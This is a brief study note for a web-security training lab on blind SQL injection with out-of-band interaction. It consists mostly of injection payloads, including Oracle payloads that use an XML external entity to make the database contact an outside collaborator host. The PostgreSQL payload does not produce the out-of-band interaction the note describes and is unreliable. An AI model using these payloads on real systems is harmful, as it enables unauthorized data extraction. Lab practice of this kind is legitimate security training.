# Lab: Blind SQL injection with out-of-band interaction (Practitioner)

**Goal:** Trigger an out-of-band DNS/HTTP interaction (Burp Collaborator required).

## Technique

Use database functions that cause external network interactions (DNS lookup, HTTP request).

## Common Payloads

**Oracle:**

```
' AND EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l')='a
```

**PostgreSQL:**

```
'; SELECT pg_sleep(0); SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE 1/(SELECT 0) END; -- or use copy or other
```

More reliably, use:

**Oracle (recommended for this lab):**

```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-ID.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

Or simpler XXE-style for OOB.

Check the lab solution for the exact Collaborator payload required.
